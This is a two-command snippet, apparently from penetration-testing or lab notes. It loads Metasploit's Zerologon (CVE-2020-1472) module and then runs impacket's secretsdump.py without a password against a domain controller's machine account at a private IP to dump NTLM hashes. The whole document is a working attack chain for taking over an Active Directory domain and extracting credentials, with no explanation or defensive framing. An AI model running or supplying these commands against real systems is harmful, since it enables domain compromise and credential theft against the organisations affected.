
```
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
```

```sh
secretsdump.py DC1\$@192.168.179.132 -no-pass -just-dc-ntlm
```